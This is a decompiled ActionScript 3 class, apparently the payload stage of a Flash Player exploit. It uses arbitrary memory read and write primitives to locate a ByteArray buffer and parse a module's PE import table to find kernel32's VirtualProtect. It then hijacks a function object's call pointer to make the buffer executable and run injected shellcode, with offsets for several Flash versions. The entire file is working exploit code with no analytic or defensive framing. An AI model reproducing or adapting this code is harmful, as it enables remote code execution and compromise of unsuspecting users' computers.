package
{
   import flash.utils.ByteArray;
   
   public class Payload
   {
       
      private var starter:Starter = null;
      
      private var exp:Exploit = null;
      
      private var var_187:uint;
      
      private var ba_len:int = 2097152;
      
      private var ba:ByteArray = null;
      
      private var MZ:uint = 9460301;
      
      private var PE:uint = 17744;
      
      private var ba_data:uint = 0;
      
      private var virtual_protect:uint = 0;
      
      private var var_228:uint = 0;
      
      private var dummy_addr:uint = 0;
      
      public function Payload(param1:Starter)
      {
         var_187 = -4096;
         super();
         this.starter = param1;
         this.exp = this.starter.exp_class;
      }
      
      private static function dummy(... rest) : uint
      {
         return 0;
      }
      
      private function read_uint(param1:uint) : uint
      {
         return this.exp.read_uint(param1);
      }
      
      private function write_uint(param1:uint, param2:uint) : void
      {
         this.exp.write_uint(param1,param2);
      }
      
      private function get_obj_addr(param1:Object) : uint
      {
         return this.exp.get_obj_addr(param1);
      }
      
      private function init_ba() : void
      {
         this.ba = new ByteArray();
         this.ba.endian = "littleEndian";
         this.ba.length = this.ba_len;
         this.ba.writeUnsignedInt(3133078208);
      }
      
      private function find_data() : Boolean
      {
         var _loc3_:* = 0;
         var _loc1_:uint = 64;
         if(!this.starter.is_dbg)
         {
            if(this.starter.v19)
            {
               _loc1_ = 68;
            }
            if(this.starter.v11_2)
            {
               _loc1_ = 56;
            }
            if(this.starter.v10)
            {
               _loc1_ = 60;
            }
         }
         else
         {
            if(this.starter.v19)
            {
               return false;
            }
            _loc1_ = 68;
         }
         var _loc2_:uint = 0;
         var _loc4_:uint = this.get_obj_addr(this.ba);
         if(this.starter.v11_2 || Boolean(this.starter.v10))
         {
            _loc2_ = this.read_uint(_loc4_ + _loc1_);
         }
         else
         {
            _loc3_ = this.read_uint(_loc4_ + _loc1_);
            _loc2_ = this.read_uint(_loc3_ + 8);
         }
         this.ba_data = _loc2_;
         return true;
      }
      
      private function find_virtprot() : Boolean
      {
         var _loc17_:* = 0;
         var _loc18_:* = 0;
         var _loc15_:* = null;
         var _loc5_:* = 0;
         var _loc20_:* = 0;
         var _loc4_:* = null;
         var _loc8_:uint = 0;
         var _loc10_:uint = this.read_uint(this.exp.var_27);
         var _loc22_:uint = _loc10_ & this.var_187;
         while(true)
         {
            _loc8_ = this.read_uint(_loc22_);
            if(_loc8_ != this.MZ)
            {
               _loc22_ = _loc22_ - 4096;
               continue;
            }
            break;
         }
         var _loc7_:uint = this.read_uint(_loc22_ + 60);
         var _loc16_:uint = _loc22_ + _loc7_;
         _loc8_ = this.read_uint(_loc16_);
         if(_loc8_ != this.PE)
         {
            return false;
         }
         var _loc1_:uint = _loc16_ + 128;
         var _loc14_:uint = this.read_uint(_loc1_ + 0);
         var _loc13_:uint = this.read_uint(_loc1_ + 4);
         var _loc11_:uint = _loc22_ + _loc14_;
         var _loc6_:uint = "kernel32.dll".length;
         var _loc19_:uint = 0;
         var _loc3_:uint = 0;
         var _loc21_:uint = 0;
         while(_loc21_ < _loc13_)
         {
            _loc17_ = this.read_uint(_loc11_ + _loc21_ + 12);
            _loc18_ = _loc22_ + _loc17_;
            _loc15_ = this.exp.read_string(_loc18_,_loc6_);
            if(_loc15_.toLowerCase() == "kernel32.dll")
            {
               _loc19_ = this.read_uint(_loc11_ + _loc21_ + 0);
               _loc3_ = this.read_uint(_loc11_ + _loc21_ + 16);
               break;
            }
            _loc21_ = _loc21_ + 20;
         }
         if(_loc19_ == 0 || _loc3_ == 0)
         {
            return false;
         }
         var _loc2_:uint = _loc22_ + _loc19_;
         var _loc12_:uint = _loc22_ + _loc3_;
         var _loc9_:uint = "VirtualProtect".length;
         _loc21_ = 0;
         while(true)
         {
            _loc5_ = this.read_uint(_loc2_ + _loc21_);
            if(_loc5_ != 0)
            {
               _loc20_ = _loc22_ + _loc5_ + 2;
               _loc4_ = this.exp.read_string(_loc20_,_loc9_);
               if(_loc4_ == "VirtualProtect")
               {
                  this.virtual_protect = this.read_uint(_loc12_ + _loc21_);
                  return true;
               }
               _loc21_ = _loc21_ + 4;
               continue;
            }
            break;
         }
         return false;
      }
      
      private function put_dummy_args(param1:*) : *
      {
         return dummy.call.apply(null,param1);
      }
      
      private function call_dummy() : *
      {
         return dummy.call(null);
      }
      
      private function get_dummy_addr() : void
      {
         dummy();
         this.dummy_addr = this.get_obj_addr(dummy);
      }
      
      private function prepare_shell(param1:uint, param2:uint) : Boolean
      {
         var _loc12_:* = 0;
         var _loc6_:* = 0;
         var _loc13_:* = 0;
         var _loc3_:* = 0;
         var _loc8_:* = 0;
         var _loc9_:int = 0;
         this.get_dummy_addr();
         var _loc18_:uint = 28;
         var _loc15_:uint = 32;
         var _loc11_:uint = 176;
         if(!this.starter.is_dbg)
         {
            if(this.starter.v11_4)
            {
               _loc11_ = 168;
               _loc18_ = 24;
               _loc15_ = 28;
            }
            if(this.starter.v11_3)
            {
               _loc11_ = 152;
               _loc18_ = 24;
               _loc15_ = 28;
            }
            if(this.starter.v11_1)
            {
               _loc11_ = 136;
               _loc18_ = 24;
               _loc15_ = 28;
            }
            if(this.starter.v10)
            {
               _loc11_ = 292;
               _loc18_ = 20;
               _loc15_ = 24;
            }
         }
         else
         {
            _loc11_ = 188;
         }
         if(this.starter.v18209_13309)
         {
            _loc11_ = 180;
         }
         this.var_228 = this.read_uint(this.dummy_addr + _loc18_);
         var _loc16_:uint = this.read_uint(this.dummy_addr + _loc15_);
         if(this.starter.v10)
         {
            _loc12_ = this.read_uint(this.dummy_addr + 8);
            _loc6_ = this.read_uint(_loc12_ + 4);
            _loc13_ = this.read_uint(_loc6_ + 4);
         }
         else
         {
            _loc13_ = this.read_uint(this.dummy_addr + 8);
         }
         var _loc14_:uint = this.read_uint(_loc13_ + 20);
         var _loc10_:uint = this.read_uint(_loc14_ + 4);
         var _loc5_:uint = this.read_uint(_loc10_ + _loc11_);
         var _loc4_:uint = this.read_uint(_loc5_);
         while(_loc9_ < 8)
         {
            _loc3_ = this.read_uint(_loc4_ + _loc8_);
            this.write_uint(this.ba_data + _loc8_,_loc3_);
            _loc8_ = _loc8_ + 4;
            _loc9_++;
         }
         this.write_uint(this.ba_data + 28,this.virtual_protect);
         this.write_uint(this.dummy_addr + _loc18_,param1);
         this.write_uint(this.dummy_addr + _loc15_,param2);
         var _loc17_:Array = new Array(65);
         this.write_uint(_loc5_,this.ba_data);
         var _loc7_:* = this.put_dummy_args(_loc17_);
         this.write_uint(_loc5_,_loc4_);
         this.write_uint(this.dummy_addr + _loc18_,this.var_228);
         this.write_uint(this.dummy_addr + _loc15_,_loc16_);
         return _loc7_ == null;
      }
      
      private function run_shell(param1:ByteArray) : Boolean
      {
         var _loc10_:* = undefined;
         var _loc2_:uint = this.ba_data + 1048576;
         var _loc7_:* = _loc2_;
         param1.position = 0;
         while(param1.position < param1.length)
         {
            _loc10_ = param1.readUnsignedInt();
            this.write_uint(_loc7_,_loc10_);
            _loc7_ = _loc7_ + 4;
         }
         if(!this.find_virtprot())
         {
            return false;
         }
         if(!this.prepare_shell(this.ba_data & this.var_187,this.ba_len))
         {
            return false;
         }
         var _loc9_:uint = 8;
         var _loc4_:uint = 4;
         if(this.starter.v10)
         {
            _loc9_ = 4;
            _loc4_ = 0;
         }
         var _loc8_:uint = this.read_uint(this.var_228 + _loc9_);
         var _loc3_:uint = _loc8_ + _loc4_;
         var _loc5_:uint = this.read_uint(_loc3_);
         this.write_uint(_loc3_,_loc2_);
         var _loc6_:* = this.call_dummy();
         this.write_uint(_loc3_,_loc5_);
         return true;
      }
      
      private function get_shell() : ByteArray
      {
         return this.starter.shell;
      }
      
      public function start() : Boolean
      {
         this.init_ba();
         if(!this.find_data())
         {
            return false;
         }
         if(!this.run_shell(this.get_shell()))
         {
            return false;
         }
         return true;
      }
   }
}
